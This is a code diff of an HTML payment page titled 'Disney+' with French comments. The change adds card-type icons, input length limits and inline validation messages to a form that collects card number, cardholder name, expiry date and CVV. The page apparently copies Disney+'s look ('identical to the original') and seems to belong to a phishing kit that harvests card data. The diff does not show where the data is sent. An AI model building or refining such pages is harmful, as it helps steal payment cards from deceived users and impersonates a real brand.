@@ -4,145 +4,51 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure Payment | Disney+</title>
+  <link rel="stylesheet" href="style.css"/>
   <style>
-    /* Styles identiques à l'original */
-    body.page-form {
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-      background-color: #f5f5f7;
-      color: #333;
-      margin: 0;
-      padding: 20px;
+    /* Styles supplémentaires spécifiques à la page de paiement */
+    .card-icon-container {
       display: flex;
       justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      gap: 12px;
+      margin: 16px 0;
     }
     
-    main {
-      background: white;
-      border-radius: 12px;
-      padding: 30px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      max-width: 450px;
-      width: 100%;
-      box-sizing: border-box;
+    .card-icon {
+      height: 28px;
+      object-fit: contain;
+      opacity: 0.3;
+      transition: opacity 0.3s;
     }
     
-    .center-logo {
-      display: block;
-      margin: 0 auto 20px;
-      max-width: 180px;
+    .card-icon.active {
+      opacity: 1;
     }
     
-    h1 {
-      text-align: center;
-      font-weight: 600;
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #1a1a2e;
+    .form-row {
+      display: flex;
+      gap: 15px;
     }
     
-    form {
+    .form-group {
+      flex: 1;
       display: flex;
       flex-direction: column;
     }
     
-    input {
-      padding: 14px;
-      margin-bottom: 16px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 16px;
-    }
-    
-    input:focus {
-      outline: none;
-      border-color: #0063e5;
-    }
-    
-    button {
-      background-color: #0063e5;
-      color: white;
-      border: none;
-      padding: 16px;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-    
-    button:hover {
-      background-color: #004db3;
-    }
-    
-    .footer-note {
-      margin-top: 30px;
-      text-align: center;
-      font-size: 0.85rem;
-      color: #666;
-    }
-    
-    .footer-note a {
-      color: #0063e5;
-      text-decoration: none;
-    }
-    
-    .footer-note a:hover {
-      text-decoration: underline;
-    }
-    
-    .logos-container {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 15px;
-      margin-top: 15px;
-    }
-    
-    .logos-container img {
-      height: 28px;
-      object-fit: contain;
-    }
-    
-    /* Spinner */
-    #spinnerOverlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    
-    .spinner {
-      border: 4px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top: 4px solid #fff;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    /* Styles discrets pour la validation */
     .error-border {
-      border-color: #ff3860 !important;
+      border: 2px solid #ff3860 !important;
     }
     
-    .card-type-detected {
-      position: relative;
+    .error-message {
+      color: #ff3860;
+      font-size: 12px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+      text-align: left;
     }
     
-    .card-type-detected::after {
-      content: '';
+    .card-type-indicator {
       position: absolute;
       right: 10px;
       top: 50%;
@@ -152,18 +58,11 @@
       background-size: contain;
       background-repeat: no-repeat;
       background-position: center;
+      display: none;
     }
     
-    .card-type-visa::after {
-      background-image: url('Images/visa.png');
-    }
-    
-    .card-type-mastercard::after {
-      background-image: url('Images/Mastercard.png');
-    }
-    
-    .card-type-amex::after {
-      background-image: url('Images/Amex.png');
+    .input-wrapper {
+      position: relative;
     }
   </style>
 </head>
@@ -175,17 +74,32 @@
     <h1>Payment Information</h1>
 
     <!-- Payment icons -->
-    <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
-      <img src="Images/visa.png" alt="Visa" style="height:28px; object-fit:contain;"/>
-      <img src="Images/Mastercard.png" alt="Mastercard" style="height:28px; object-fit:contain;"/>
-      <img src="Images/Amex.png" alt="American Express" style="height:28px; object-fit:contain;"/>
+    <div class="card-icon-container">
+      <img src="Images/visa.png" alt="Visa" class="card-icon" id="visaIcon"/>
+      <img src="Images/Mastercard.png" alt="Mastercard" class="card-icon" id="mastercardIcon"/>
+      <img src="Images/Amex.png" alt="American Express" class="card-icon" id="amexIcon"/>
     </div>
 
     <form id="paymentForm">
-      <input type="text" id="cardNumber" placeholder="Card Number" required/>
+      <div class="input-wrapper">
+        <input type="text" id="cardNumber" placeholder="Card Number" required maxlength="19"/>
+        <div class="card-type-indicator" id="cardTypeIndicator"></div>
+      </div>
+      <div id="cardNumberError" class="error-message"></div>
+      
       <input type="text" id="cardName" placeholder="Name on Card" required/>
-      <input type="text" id="expiryDate" placeholder="MM/YY" required/>
-      <input type="text" id="cvv" placeholder="CVV" required/>
+      <div id="cardNameError" class="error-message"></div>
+      
+      <div class="form-row">
+        <div class="form-group">
+          <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5"/>
+          <div id="expiryDateError" class="error-message"></div>
+        </div>
+        <div class="form-group">
+          <input type="text" id="cvv" placeholder="CVV" required maxlength="4"/>
+          <div id="cvvError" class="error-message"></div>
+        </div>
+      </div>
 
       <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
         By confirming your payment, you agree that your subscription will begin immediately and renew automatically each month. No commitment – you can cancel at any time.
@@ -305,6 +219,7 @@
       const expiryDateInput = document.getElementById('expiryDate');
       const cvvInput = document.getElementById('cvv');
       const form = document.getElementById('paymentForm');
+      const cardTypeIndicator = document.getElementById('cardTypeIndicator');
       
       let currentCardType = null;
       
@@ -316,10 +231,17 @@
         // Détecter le type de carte
         currentCardType = detectCardType(this.value);
         
-        // Mettre à jour l'apparence visuelle
-        this.classList.remove('card-type-visa', 'card-type-mastercard', 'card-type-amex', 'card-type-detected');
+        // Mettre à jour l'affichage des icônes
+        document.getElementById('visaIcon').classList.toggle('active', currentCardType === 'visa');
+        document.getElementById('mastercardIcon').classList.toggle('active', currentCardType === 'mastercard');
+        document.getElementById('amexIcon').classList.toggle('active', currentCardType === 'amex');
+        
+        // Afficher l'indicateur de type de carte
         if (currentCardType) {
-          this.classList.add('card-type-detected', `card-type-${currentCardType}`);
+          cardTypeIndicator.style.display = 'block';
+          cardTypeIndicator.style.backgroundImage = `url('Images/${currentCardType}.png')`;
+        } else {
+          cardTypeIndicator.style.display = 'none';
         }
       });
       
@@ -349,6 +271,16 @@
         expiryDateInput.classList.toggle('error-border', !isExpiryDateValid);
         cvvInput.classList.toggle('error-border', !isCVVValid);
         document.getElementById('cardName').classList.toggle('error-border', !isNameValid);
+        
+        // Afficher les messages d'erreur
+        document.getElementById('cardNumberError').textContent = 
+          !isCardNumberValid ? 'Invalid card number' : '';
+        document.getElementById('expiryDateError').textContent = 
+          !isExpiryDateValid ? 'Invalid expiration date' : '';
+        document.getElementById('cvvError').textContent = 
+          !isCVVValid ? 'Invalid CVV' : '';
+        document.getElementById('cardNameError').textContent = 
+          !isNameValid ? 'Please enter the name on card' : '';
         
         // Si tout est valide, procéder au paiement
         if (isCardNumberValid && isExpiryDateValid && isCVVValid && isNameValid) {
